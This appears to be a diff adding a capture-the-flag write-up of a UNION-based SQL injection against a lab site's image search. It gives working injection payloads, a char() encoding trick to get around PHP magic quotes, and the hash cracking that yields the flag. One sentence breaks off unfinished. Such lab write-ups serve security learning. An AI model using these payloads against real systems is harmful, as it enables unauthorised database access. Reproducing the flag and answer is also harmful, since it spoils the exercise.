@@ -1,0 +1,30 @@
+SQL Injection - Images Search:
+INFO:
+Columns: 2: Title, Url
+Version: 5.5.44-0ubuntu0.12.04.1
+Table Names: users, guestbook, list_images, vote_dbs
+Ascii “list_images” - 108,105,115,116,095,105,109,097,103,101,115
+
+Steps & Commands:
+
+1 or 1=1 
+	Using this command once again to show everything that can be returned from the search for an image based on image number. This returns one entry that has a title of “Hack Me?”
+
+1 or 1=1 UNION SELECT column_name, 2 FROM information_schema.columns where table_name=char(108,105,115,116,095,105,109,097,103,101,115)-- -
+	Since this is another sql injection to the same database as the members search we start using this command to get the columns inside the list_images table since we know it exists already and that one entry is asking us to hack it.
+	We convert list_images to ascii to once again avoid the magic quotes function in php that will escape all quotes
+	This command shows us that there is 
+
+1 or 1=1 UNION SELECT comment, 2 FROM list_images-- -
+	Since Commentaire was the column that gave us a hint as to what to hack in the members section we decided to start searching in the comments column this time.
+	It returned one entry that says “If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46”
+	Cracking the md5 hash shows us that the hashed word is “albatroz”
+	Placing “albatroz” into a sha256 hasher gives us the flag F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
+
+RESOURCES:
+http://www.sqlinjection.net/tutorial/
+https://portswigger.net/web-security/sql-injection/union-attacks
+Basic SQL Injection Guide #1 - Union SQL Injection GET Search
+Ascii Converter
+https://hashkiller.co.uk/Cracker/MD5
+https://passwordsgenerator.net/sha256-hash-generator/
